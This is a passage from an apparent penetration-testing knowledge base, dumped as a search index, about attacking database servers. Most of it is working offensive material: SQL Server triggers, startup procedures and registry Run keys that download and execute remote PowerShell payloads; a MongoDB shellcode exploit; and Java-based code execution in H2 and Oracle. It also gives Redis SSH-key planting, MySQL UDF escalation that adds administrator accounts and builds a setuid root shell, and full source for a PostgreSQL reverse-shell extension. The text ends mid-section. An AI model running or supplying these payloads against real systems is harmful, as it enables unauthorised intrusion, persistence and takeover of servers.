http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html Search for linked databases: select - from master .. sysservers Get - SQLServerLink - Instance instance - Verbose Run queries on linked databases: select - from openquery ( instance , select - frommaster..sysservers ) Run queries on chain of linked databases: select - from openquery ( inatance1 , select - from openquery( instance2 , select - from master..sysservers ) ) Get-SQLServerLinkCrawl -Instance instance1 -Verbose If rpcout is enabled for all links (disabled by default), xp_cmdshell can be enabled using: EXECUTE ( sp_configure xp_cmdshell ,1;reconfigure; ) AT instance2 ) Command execution with linked databases: select - from openquery ( instance1 , select - from openquery( instance2 , select - from openquery( instance3 , select @@version as version;exec master..xp_cmdshell cmd /c calc.exe ) ) ) Get-SQLServerLinkCrawl -Instance instance1 -Query exec master..xp_cmdshell cmd /c calc.exe -Verbose Decrypting Database Link Server Passwords: https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/","title":"Database Links"},{"location":"databases-sqlserver/#persistence","text":"","title":"Persistence"},{"location":"databases-sqlserver/#startup-stored-procedures","text":"sysadmin privileges are required to mark proc for automated execution Owned only by sa Must be in the master database Cannot have input or output parameters Gets executed with sysadmin privileges Executed when SQL Server restart References: https://technet.microsoft.com/en-us/library/ms191129(v=sql.105).aspx https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/ Create: USE master GO CREATE PROCEDURE sp_autops AS EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO EXEC sp_procoption @ ProcName = sp_autops , @ OptionName = startup , @ OptionValue = on ; List: SELECT [ name ] FROM sysobjects WHERE type = P AND OBJECTPROPERTY ( id , ExecIsStartUp ) = 1 ;","title":"Startup stored procedures"},{"location":"databases-sqlserver/#triggers","text":"References: https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql","title":"Triggers"},{"location":"databases-sqlserver/#data-definition-language-ddl-triggers","text":"Execute under the context of the user that calls the trigger References: https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups CREATE Trigger [ persistence_ddl_1 ] ON ALL Server -- or DATABASE FOR DDL_LOGIN_EVENTS -- See the docs below for events and event groups AS EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO","title":"Data Definition Language (DDL) Triggers"},{"location":"databases-sqlserver/#data-manipulation-language-dml-triggers","text":"Execute under the context of the user that calls the trigger User should have privilages to do the task in the trigger References: https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers USE master GRANT IMPERSONATE ON LOGIN :: sa to [ Public ]; USE testdb CREATE TRIGGER [ persistence_dml_1 ] ON testdb . dbo . datatable FOR INSERT , UPDATE , DELETE AS EXECUTE AS LOGIN = sa EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO","title":"Data Manipulation Language (DML) Triggers"},{"location":"databases-sqlserver/#logon-triggers","text":"Ideal for triggering with a logon failure of a low-privilege user. References: https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers CREATE Trigger [ persistence_logon_1 ] ON ALL SERVER WITH EXECUTE AS sa FOR LOGON AS BEGIN IF ORIGINAL_LOGIN () = testuser EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) END ; List all Triggers SELECT - FROM sys . server_triggers Get-SQLTriggerDdl -Instance instance -username sa -Password pw -Verbose","title":"Logon Triggers"},{"location":"databases-sqlserver/#registry-keys","text":"xp_regwrite Needs sysadmin EXEC xp_regwrite @ rootkey = HKEY_LOCAL_MACHINE , @ key = Software\\Microsoft\\Windows\\CurrentVersion\\Run , @ value_name = SQLServerUpdate , @ type = REG_SZ , @ value = powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 ) Get-SQLPersistRegDebugger -Instance instance -username sa -Password pw -FileName utilman . exe -Command c:\\windows\\system32\\cmd.exe -Verbose Get-SQLPersistRegRun -Instance instance -username sa -Password pw -Name SQLUpdate -Command powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 ) -Verbose xp_regread Limited read for public role References: https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/ DECLARE @ Reg_Value VARCHAR ( 1000 ) EXECUTE xp_regread HKEY_LOCAL_MACHINE , SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\CurrentVersion , \u2018 ProductName , @ Reg_Value OUTPUT SELECT @ Reg_Value Read auto-login password: Get-SQLRecoverPwAutoLogon -Instance instance -username sa -Password pw -Verbose xp_regdeletekey Needs sysadmin References: https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-is-denied-error-message-when-a-query-cal","title":"Registry keys"},{"location":"databases-sqlserver/#defence","text":"Audit links, trusts, privileges and credentials. Service Accounts for databases should not be high privilege domain account. Known dangerous Stored Procedures are disabled. Use audit features to log interesting events. Monitor the logs ( Management Studio - Management - SQL Server Logs ) Error log @ Program - Files \\ Microsoft SQL Server \\ MSSQL . 1 MSSQL \\ LOG \\ ERRORLOG Logs are also written to Windows Application logs with MSSQLSERVER as source. Good password policy. Not using same username across databases. Logon failures are logged by default (source MSSQLSERVER ). Event ID Description 18456 Authentication failures 5084 Setting TRUSTWORTHY to on/off 17135 Launch of startup stored procedures 33090 Successful DLL loading 17750 Failed DLL loading 15457 Using sp_configure (command execution)","title":"Defence"},{"location":"databases-sqlserver/#references","text":"https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/ https://blog.anitian.com/hacking-sql-servers-without-password/","title":"References"},{"location":"databases/","text":"Tools NoSQLMap - https://github.com/codingo/NoSQLMap SQLMap - http://sqlmap.org/ SqlServer Moved to dedicated section at https://kbase.ayoma.me/databases-sqlserver/ MongoDB Connect: mongo - p - u $ USER $ DB_NAME RCE: https://cxsecurity.com/issue/WLB-2013030212 db . my_collection . find ({ $where : shellcode=unescape( METASPLOIT JS GENERATED SHELLCODE ); sizechunk=0x1000; chunk= ; for(i=0;i sizechunk;i++){ chunk+=unescape( %u9090%u9090 ); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i 25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape( %uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000 ); sizechunk2=0x1000; chunk2= ; for(i=0;i sizechunk2;i++){ chunk2+=unescape( %u5a70%u0805 ); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i 25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({ x : 0x836e204}, [ A + \\x26\\x18\\x35\\x08 + MongoSploit! + \\x58\\x71\\x45\\x08 + sthack is a nice place to be + \\x6c\\x5a\\x05\\x08 + \\x20\\x20\\x20\\x20 + \\x58\\x71\\x45\\x08 ]); }) References: - https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html Microsoft Access MDB Tools - Read Access databases on *nix: https://github.com/brianb/mdbtools mdb-tables backup.mdb | grep --color = auto user mdb-export backup.mdb tableName H2 RCE: CREATE \u200b \u200b ALIAS \u200b SHELLEXEC \u200b AS \u200b $$ \u200b String \u200b shellexec ( \u200b String \u200b cmd ) throws java . io . IOException { java . util . Scanner s = \u200b new java . util . Scanner ( Runtime . getRuntime (). exec ( cmd ). getInputStream ()). useDelim iter ( \u200b \\\\A \u200b ); return s . hasNext () ? s . next () : ; }$$ ; CALL \u200b SHELLEXEC ( \u200b id \u200b ) Redis Redis-tools: sudo apt - get install redis - tools http://antirez.com/news/96 Connect and basic query: redis-cli -h 10 .10.10.160 10 .10.10.160:6379 dbsize ( integer ) 0 ( 0 .51s ) 10 .10.10.160:6379 CONFIG GET databases 1 ) databases 2 ) 16 ( 0 .63s ) 10 .10.10.160:6379 INFO keyspace # Keyspace ( 0 .56s ) 10 .10.10.160:6379 INFO Write to authorized_keys file: ssh-keygen -f redis echo -ne \\n\\n public ; cat redis.pub public redis-cli -h 10 .10.10.160 SLAVEOF NO ONE cat public | redis-cli -h 10 .10.10.160 -x set pub redis-cli -h 10 .10.10.160 CONFIG SET dir /var/lib/redis/.ssh redis-cli -h 10 .10.10.160 CONFIG SET dbfilename authorized_keys redis-cli -h 10 .10.10.160 SAVE Sqlte Dump entire database: sqlite3 some.db .schema schema.sql sqlite3 some.db .dump dump.sql grep -vx -f schema.sql dump.sql data.sql import sqlite3 conn = sqlite3 . connect ( users.db ) cursor = conn . execute ( Select * from sqlite_master ) for i in cursor . fetchall (): print i Dump into CSV . mode csv -- use .separator SOME_STRING for something other than a comma. . headers on . out file . csv select * from MyTable ; Insert into SQL: . mode insert target_table_name . out file . sql select * from MyTable ; MySQL Online complier: https://rextester.com/l/mysql_online_compiler Bruteforce: hydra - l root - P / path / to / wordlist . txt ( TARGET IP ADDRESS ) mysql Connection tests mysql - h Hostname - u root mysql - h Hostname - u root mysql - h Hostname - u root @ localhost mysql - h Hostname mysql - h Hostname - u @ localhost mysql - u john - phiroshima - e show databases mysql - u john - phiroshima - D webapp - e show tables Configuration files: Windows config.ini my.ini windows\\my.ini winnt\\my.ini /mysql/data/ UNIX /etc/my.cnf /etc/mysql/my.cnf /var/lib/mysql/my.cnf ~/.my.cnf /etc/my.cnf Command history: ~/.mysql.history Log files: connections.log update.log common.log Bypass Avoid quotes: select concat ( 1337 , aaaa ) == select concat ( 0 x31333337 , 0 x61616161 ) List udf: select * from mysql . func Privilege Escalation Current access level: mysql select user (); mysql select user , password , create_priv , insert_priv , update_priv , alter_priv , delete_priv , drop_priv from user where user = OUTPUT OF select user() ; Access passwords: mysql use mysql mysql select user , password from user ; Create new user and grant permissions: mysql create user test identified by test ; mysql grant SELECT , CREATE , DROP , UPDATE , DELETE , INSERT on * . * to mysql identified by mysql WITH GRANT OPTION ; Break into shell: mysql \\ ! cat / etc / passwd mysql \\ ! bash show variables like secure_file_priv ; # if empty can run UDF exploits select @@ plugin_dir ; - https://www.exploit-db.com/exploits/1518 - gcc - g - c udf . c - gcc - g - shared - Wl , - soname , udf . so - o udf . so udf . o - lc - Converting the udf.so to a hexadecimal string, removing whitespaces and retrieving the output in a single line with a \"\u200b0x\u200b\" in the beginning of the payload string. - od - An - vtx1 udf . so | tr - d \\040\\011\\012\\015 udf_output - sed s/.*7f454c460201010/0x / udf_output udf - SELECT \u200b CONTENT OF THE udf file \u200b INTO DUMPFILE /usr/lib/mysql/plugin/udf.so ; - create function do_system returns integer soname udf.so ; - select do_system ( id /tmp/out; chmod 777 /tmp/out ); - select LOAD_FILE ( /tmp/out ); MySQL root to system root MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux Take lib from SQLMap and dump it into the server: udf / mysql / linux / 32 / lib_mysqludf_sys . so udf / mysql / linux / 64 / lib_mysqludf_sys . so udf / mysql / windows / 32 / lib_mysqludf_sys . dll udf / mysql / windows / 64 / lib_mysqludf_sys . dll On Windows: USE mysql ; CREATE TABLE npn ( line blob ); INSERT INTO npn values ( load_file ( C://xampplite//htdocs//mail//lib_mysqludf_sys.dll )); SELECT * FROM mysql . npn INTO DUMPFILE c://windows//system32//lib_mysqludf_sys_32.dll ; CREATE FUNCTION sys_exec RETURNS integer SONAME lib_mysqludf_sys_32.dll ; SELECT sys_exec ( net user npn npn12345678 /add ); SELECT sys_exec ( net localgroup Administrators npn /add ); On Linux: use mysql ; create table npn ( line blob ); insert into npn values ( load_file ( /home/npn/lib_mysqludf_sys.so )); select * from npn into dumpfile /usr/lib/lib_mysqludf_sys.so ; create function sys_exec returns integer soname lib_mysqludf_sys.so ; select sys_exec ( id /tmp/out; chown npn.npn /tmp/out ); npn @ pwn : ~ $ cat / tmp / out uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ), 1 ( bin ), 2 ( daemon ), 3 ( sys ), 4 ( adm ) // Create a shell , compile it , chmod +s /tmp/shell and get reverse shell #include stdio.h #include sys/types.h #include unistd.h int main ( void ) { setuid ( 0 ); setgid ( 0 ); system ( \u201c / bin / bash \u201d ); } gcc -o /tmp/shell /home/npn/shell.c chmod +s /tmp/shell Postgresql Online complier: https://rextester.com/l/postgresql_online_compiler Ref: https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions https://pulsesecurity.co.nz/articles/postgres-sqli https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution Docs: String operations: https://www.postgresql.org/docs/9.2/functions-string.html Lexical structure: https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html Copy: https://www.postgresql.org/docs/9.2/sql-copy.html Large Object: https://www.postgresql.org/docs/9.2/largeobjects.html Can do stacked queries ( query1 ; query2 ) Returns multiple result-sets Time based blind: injection ; select pg_sleep ( 10 ); injection ; SELECT case when (SELECT current_setting($$is_superuser$$)) = $$on$$ then pg_sleep(10) end;-- SELECT current_setting ( is_superuser ); Base64: select convert_from ( decode ( base64 , base64 ), utf-8 ); Decoding: SELECT CONVERT_FROM ( DECODE ( field , BASE64 ), UTF-8 ) FROM table ; Encoding: SELECT ENCODE ( CONVERT_TO ( field , UTF-8 ), base64 ) FROM table ; Bypass Avoid quotes: SELECT CHR ( 65 ) || CHR ( 65 ) || CHR ( 65 ) || CHR ( 65 ); = SELECT AAAA ; = SELECT $$ AAAA$$ ; == SELECT $ TAG$AAAA$TAG$ ; https://www.postgresql.org/docs/9.4/functions-string.html https://www.postgresql.org/docs/9.4/sql-syntax-lexical.html File access Read: COPY table_name from file_name Read file using SQLI CREATE temp table test ( content text ); COPY test from $$ c : \\ test . txt$$ ; SELECT content from test ; DROP table test ; Write: Cannot handle multiple lines COPY table_name to file_name COPY ( select $$ example$$ ) to file_name COPY ( select convert_from ( decode ($$ ENCODED_PAYLOAD $$,$$ base64 $$),$$ utf-8 $$)) to $$ C : \\\\ example . exe $$; Load extension: CREATE OR REPLACE FUNCTION test ( text , integer ) RETURNS void AS FILENAME , test LANGUAGE C STRICT ; CREATE OR REPLACE FUNCTION test ( text , integer ) RETURNS void AS $$\\\\ 192 . 168 . 1 . 2 \\ test \\ test . dll$$ , test LANGUAGE C STRICT ; c :\\ Program Files ( x86 ) \\ PostgreSQL \\ 9 . 2 \\ include \\ server \\ port \\ win32_msvc ;c:\\Program Files (x86)\\PostgreSQL\\9.2\\include\\server\\port\\win32;c:\\Program Files (x86)\\PostgreSQL\\9.2\\include\\server;c:\\Program Files (x86)\\PostgreSQL\\9.2\\include;%(AdditionalIncludeDirectories) Large object https://www.postgresql.org/docs/9.2/static/largeobjects.html Read file: select lo_import ( C:\\\\Windows\\\\win.ini , 1234 ); select loid , pageno from pg_largeobject ; The amount of data per page is defined to be LOBLKSIZE (which is currently BLCKSZ/4, or typically 2 kB). select loid , pageno , encode ( data , escape ) from pg_largeobject ; Write file: update pg_largeobject set data = decode ( 74657374 , hex ) where loid = 1234 and pageno = 0 ; select lo_export ( 1234 , C:\\\\new_win.ini ); List: \\ lo_list Delete: \\ lo_unlink 1234 https://github.com/sourceincite/tools/blob/master/pgpwn.c /* pgpwn.c date: 23/11/2016 Developed by: mr_me Synopsis: ========= This code creates a postgres extension that registers a connect_back() function allowing an attacker to gain a reverse shell. Motivation: =========== A zero-day that runs the postgres user as SYSTEM and whereby I could not gain rce via writing to disk without a reboot. Benefits: ========= - No touching disk... - Can be loaded from remote... Example Usage: ============== 1. Register the function: ------------------------- CREATE FUNCTION connect_back(text, integer) RETURNS void AS $$\\\\vmware-host\\Shared Folders\\research\\DemoExtension.dll$$, $$connect_back$$ LANGUAGE C STRICT; That loads the DLL from remote, via a share! ;-) 2. Execute it: -------------- SELECT connect_back( 172.16.175.1 , 1234); 3. On the attackers machine: ------------------------------ saturn:~ mr_me$ nc -lv 1234 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Program Files\\PostgreSQL\\9.2\\data whoami whoami nt authority\\network service C:\\Program Files\\PostgreSQL\\9.2\\data 4. Now, if you want to remove it, simply: ----------------------------------------- DROP FUNCTION connect_back(text, integer); References: =========== 1. http://blog.2ndquadrant.com/compiling-postgresql-extensions-visual-studio-windows/ License: ======== This code is licensed under the Creative Commons Attribution-Non\u2011Commercial 4.0 International License. */ #define _WINSOCK_DEPRECATED_NO_WARNINGS #include postgres.h #include string.h #include fmgr.h #include utils/geo_decls.h #include stdio.h #include winsock2.h #include utils/builtins.h #pragma comment(lib, ws2_32 ) #ifdef PG_MODULE_MAGIC PG_MODULE_MAGIC ; #endif /* Add a prototype marked PGDLLEXPORT */ PGDLLEXPORT Datum connect_back ( PG_FUNCTION_ARGS ); PG_FUNCTION_INFO_V1 ( connect_back ); WSADATA wsaData ; SOCKET s1 ; struct sockaddr_in hax ; char ip_addr [ 16 ]; STARTUPINFO sui ; PROCESS_INFORMATION pi ; Datum connect_back ( PG_FUNCTION_ARGS ) { /* convert C string to text pointer */ #define GET_TEXT(cstrp) \\ DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp))) /* convert text pointer to C string */ #define GET_STR(textp) \\ DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp))) WSAStartup ( MAKEWORD ( 2 , 2 ), wsaData ); s1 = WSASocket ( AF_INET , SOCK_STREAM , IPPROTO_TCP , NULL , ( unsigned int ) NULL , ( unsigned int ) NULL ); hax . sin_family = AF_INET ; hax . sin_port = htons ( PG_GETARG_INT32 ( 1 )); hax . sin_addr . s_addr = inet_addr ( GET_STR ( PG_GETARG_TEXT_P ( 0 ))); WSAConnect ( s1 , ( SOCKADDR * ) hax , sizeof ( hax ), NULL , NULL , NULL , NULL ); memset ( sui , 0 , sizeof ( sui )); sui . cb = sizeof ( sui ); sui . dwFlags = ( STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW ); sui . hStdInput = sui . hStdOutput = sui . hStdError = ( HANDLE ) s1 ; CreateProcess ( NULL , cmd.exe , NULL , NULL , TRUE , 0 , NULL , NULL , sui , pi ); PG_RETURN_VOID (); } Oracle RCE Add permissions (sqlPlus required): DECLARE l_schema VARCHAR2 ( 30 ) : = SYSTEM ; BEGIN DBMS_JAVA . grant_permission ( l_schema , java.io.FilePermission , ALL FILES , read ,write, execute, delete ); DBMS_JAVA . grant_permission ( l_schema , SYS:java.lang.RuntimePermission , writeFileDescriptor , ); DBMS_JAVA . grant_permission ( l_schema , SYS:java.lang.RuntimePermission , readFileDescriptor , ); END ; / Java code: CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED pwn AS import java . lang . * ; import java . io . * ; public class pwn { public static void cmd ( String command ) throws IOException { Runtime . getRuntime (). exec ( command ); } } ; / Create procedure: CREATE OR REPLACE PROCEDURE pwn_cmd ( p_command IN VARCHAR2 ) AS LANGUAGE JAVA NAME pwn.cmd (java.lang.String) ; / Run command: exec pwn_cmd ( net user trevelyn trevelyn /add ); exec pwn_cmd ( net localgroup Administrators trevelyn /add ); exec pwn_cmd ( cmd.exe /c echo open X.X.X.X C:\\ftp.txt ); Tools Oracle Database Attack Tool (ODAT) https://github.com/quentinhardy/odat All checks : . / odat . py all - s 10 . 10 . 10 . 82 - p 1521 . / odat . py all - s 10 . 10 . 10 . 82 - d XE - U scott - P tiger Gusss SID : . / odat . py sidguesser - s 10 . 10 . 10 . 82 Guess passwords : . / odat . py passwordguesser - d XE - s 10 . 10 . 10 . 82 - p 1521 -- accounts - file / root / HTB / tools / db / odat / accounts / accounts . txt Guess login : use admin / oracle / oracle_login Upload file : . / odat . py utlfile - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- sysdba -- putFile c : / writeup . exe ~/ HTB / silo / writeup . exe . / odat . py dbmsxslprocessor - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- putFile c: \\\\ inetpub \\\\ wwwroot File-Test.txt /tmp/File-Test.txt Execute file : . / odat . py externaltable - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- sysdba -- exec c : / writeup . exe Nmap nmap --script oracle-sid-brute (TARGET IP ADDRESS) -p 1521 oscanner oscanner - s ( TARGET IP ADDRESS ) Queries Get all usernames and password: SELECT Username || : || PASSWORD AS credentials FROM DBA_USERS ; DB Version: SELECT * FROM V$VERSION List all tables owned by user: SELECT table_name FROM user_tables ; Get current DB user: SELECT NAME FROM v$database ; References https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573 HSQLDB http://hsqldb.org/doc/2.0/guide/sqlroutines-chapt.html#src_jrt_routines http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_routines CREATE FUNCTION getProperty ( IN key VARCHAR ) RETURNS VARCHAR LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME CLASSPATH:java.lang.System.getProperty VALUES ( getProperty ( java.class.path )) lib / rt . jar and class path for public static void \\ w + \\ ( String CREATE PROCEDURE writeBytesToFilename ( IN paramString VARCHAR , IN paramArrayOfByte VARBINARY ( 1024 )) LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename call writeBytesToFilename ( example.txt , cast ( HEX AS VARBINARY ( 1024 )))","title":"Databases"},{"location":"databases/#tools","text":"NoSQLMap - https://github.com/codingo/NoSQLMap SQLMap - http://sqlmap.org/","title":"Tools"},{"location":"databases/#sqlserver","text":"Moved to dedicated section at https://kbase.ayoma.me/databases-sqlserver/","title":"SqlServer"},{"location":"databases/#mongodb","text":"Connect: mongo - p - u $ USER $ DB_NAME RCE: https://cxsecurity.com/issue/WLB-2013030212 db . my_collection . find ({ $where : shellcode=unescape( METASPLOIT JS GENERATED SHELLCODE ); sizechunk=0x1000; chunk= ; for(i=0;i sizechunk;i++){ chunk+=unescape( %u9090%u9090 ); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i 25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape( %uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000 ); sizechunk2=0x1000; chunk2= ; for(i=0;i sizechunk2;i++){ chunk2+=unescape( %u5a70%u0805 ); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i 25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({ x : 0x836e204}, [ A + \\x26\\x18\\x35\\x08 + MongoSploit! + \\x58\\x71\\x45\\x08 + sthack is a nice place to be + \\x6c\\x5a\\x05\\x08 + \\x20\\x20\\x20\\x20 + \\x58\\x71\\x45\\x08 ]); }) References: - https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html","title":"MongoDB"},{"location":"databases/#microsoft-access","text":"MDB Tools - Read Access databases on *nix: https://github.com/brianb/mdbtools mdb-tables backup.mdb | grep --color = auto user mdb-export backup.mdb tableName","title":"Microsoft Access"},{"location":"databases/#h2","text":"RCE: CREATE \u200b \u200b ALIAS \u200b SHELLEXEC \u200b AS \u200b $$ \u200b String \u200b shellexec ( \u200b String \u200b cmd ) throws java . io . IOException { java . util . Scanner s = \u200b new java . util . Scanner ( Runtime . getRuntime (). exec ( cmd ). getInputStream ()). useDelim iter ( \u200b \\\\A \u200b ); return s . hasNext () ? s . next () : ; }$$ ; CALL \u200b SHELLEXEC ( \u200b id \u200b )","title":"H2"},{"location":"databases/#redis","text":"Redis-tools: sudo apt - get install redis - tools http://antirez.com/news/96 Connect and basic query: redis-cli -h 10 .10.10.160 10 .10.10.160:6379 dbsize ( integer ) 0 ( 0 .51s ) 10 .10.10.160:6379 CONFIG GET databases 1 ) databases 2 ) 16 ( 0 .63s ) 10 .10.10.160:6379 INFO keyspace # Keyspace ( 0 .56s ) 10 .10.10.160:6379 INFO Write to authorized_keys file: ssh-keygen -f redis echo -ne \\n\\n public ; cat redis.pub public redis-cli -h 10 .10.10.160 SLAVEOF NO ONE cat public | redis-cli -h 10 .10.10.160 -x set pub redis-cli -h 10 .10.10.160 CONFIG SET dir /var/lib/redis/.ssh redis-cli -h 10 .10.10.160 CONFIG SET dbfilename authorized_keys redis-cli -h 10 .10.10.160 SAVE","title":"Redis"},{"location":"databases/#sqlte","text":"Dump entire database: sqlite3 some.db .schema schema.sql sqlite3 some.db .dump dump.sql grep -vx -f schema.sql dump.sql data.sql import sqlite3 conn = sqlite3 . connect ( users.db ) cursor = conn . execute ( Select * from sqlite_master ) for i in cursor . fetchall (): print i Dump into CSV . mode csv -- use .separator SOME_STRING for something other than a comma. . headers on . out file . csv select * from MyTable ; Insert into SQL: . mode insert target_table_name . out file . sql select * from MyTable ;","title":"Sqlte"},{"location":"databases/#mysql","text":"Online complier: https://rextester.com/l/mysql_online_compiler Bruteforce: hydra - l root - P / path / to / wordlist . txt ( TARGET IP ADDRESS ) mysql Connection tests mysql - h Hostname - u root mysql - h Hostname - u root mysql - h Hostname - u root @ localhost mysql - h Hostname mysql - h Hostname - u @ localhost mysql - u john - phiroshima - e show databases mysql - u john - phiroshima - D webapp - e show tables Configuration files: Windows config.ini my.ini windows\\my.ini winnt\\my.ini /mysql/data/ UNIX /etc/my.cnf /etc/mysql/my.cnf /var/lib/mysql/my.cnf ~/.my.cnf /etc/my.cnf Command history: ~/.mysql.history Log files: connections.log update.log common.log Bypass Avoid quotes: select concat ( 1337 , aaaa ) == select concat ( 0 x31333337 , 0 x61616161 ) List udf: select * from mysql . func","title":"MySQL"},{"location":"databases/#privilege-escalation","text":"Current access level: mysql select user (); mysql select user , password , create_priv , insert_priv , update_priv , alter_priv , delete_priv , drop_priv from user where user = OUTPUT OF select user() ; Access passwords: mysql use mysql mysql select user , password from user ; Create new user and grant permissions: mysql create user test identified by test ; mysql grant SELECT , CREATE , DROP , UPDATE , DELETE , INSERT on * . * to mysql identified by mysql WITH GRANT OPTION ; Break into shell: mysql \\ ! cat / etc / passwd mysql \\ ! bash show variables like secure_file_priv ; # if empty can run UDF exploits select @@ plugin_dir ; - https://www.exploit-db.com/exploits/1518 - gcc - g - c udf . c - gcc - g - shared - Wl , - soname , udf . so - o udf . so udf . o - lc - Converting the udf.so to a hexadecimal string, removing whitespaces and retrieving the output in a single line with a \"\u200b0x\u200b\" in the beginning of the payload string. - od - An - vtx1 udf . so | tr - d \\040\\011\\012\\015 udf_output - sed s/.*7f454c460201010/0x / udf_output udf - SELECT \u200b CONTENT OF THE udf file \u200b INTO DUMPFILE /usr/lib/mysql/plugin/udf.so ; - create function do_system returns integer soname udf.so ; - select do_system ( id /tmp/out; chmod 777 /tmp/out ); - select LOAD_FILE ( /tmp/out );","title":"Privilege Escalation"},{"location":"databases/#mysql-root-to-system-root","text":"MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux Take lib from SQLMap and dump it into the server: udf / mysql / linux / 32 / lib_mysqludf_sys . so udf / mysql / linux / 64 / lib_mysqludf_sys . so udf / mysql / windows / 32 / lib_mysqludf_sys . dll udf / mysql / windows / 64 / lib_mysqludf_sys . dll On Windows: USE mysql ; CREATE TABLE npn ( line blob ); INSERT INTO npn values ( load_file ( C://xampplite//htdocs//mail//lib_mysqludf_sys.dll )); SELECT * FROM mysql . npn INTO DUMPFILE c://windows//system32//lib_mysqludf_sys_32.dll ; CREATE FUNCTION sys_exec RETURNS integer SONAME lib_mysqludf_sys_32.dll ; SELECT sys_exec ( net user npn npn12345678 /add ); SELECT sys_exec ( net localgroup Administrators npn /add ); On Linux: use mysql ; create table npn ( line blob ); insert into npn values ( load_file ( /home/npn/lib_mysqludf_sys.so )); select * from npn into dumpfile /usr/lib/lib_mysqludf_sys.so ; create function sys_exec returns integer soname lib_mysqludf_sys.so ; select sys_exec ( id /tmp/out; chown npn.npn /tmp/out ); npn @ pwn : ~ $ cat / tmp / out uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ), 1 ( bin ), 2 ( daemon ), 3 ( sys ), 4 ( adm ) // Create a shell , compile it , chmod +s /tmp/shell and get reverse shell #include stdio.h #include sys/types.h #include unistd.h int main ( void ) { setuid ( 0 ); setgid ( 0 ); system ( \u201c / bin / bash \u201d ); } gcc -o /tmp/shell /home/npn/shell.c chmod +s /tmp/shell","title":"MySQL root to system root"},{"location":"databases/#postgresql","text":"Online complier: https://rextester.com/l/postgresql_online_compiler Ref: https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions https://pulsesecurity.co.nz/articles/postgres-sqli https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution Docs: String operations: https://www.postgresql.org/docs/9.2/functions-string.html Lexical structure: https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html Copy: https://www.postgresql.org/docs/9.2/sql-copy.html Large Object: https://www.postgresql.org/docs/9.2/largeobjects.html Can do stacked queries ( query1 ; query2 ) Returns multiple result-sets Time based blind: injection ; select pg_sleep ( 10 ); injection ; SELECT case when (SELECT current_setting($$is_superuser$$)) = $$on$$ then pg_sleep(10) end;-- SELECT current_setting ( is_superuser ); Base64: select convert_from ( decode ( base64 , base64 ), utf-8 ); Decoding: SELECT CONVERT_FROM ( DECODE ( field , BASE64 ), UTF-8 ) FROM table ; Encoding: 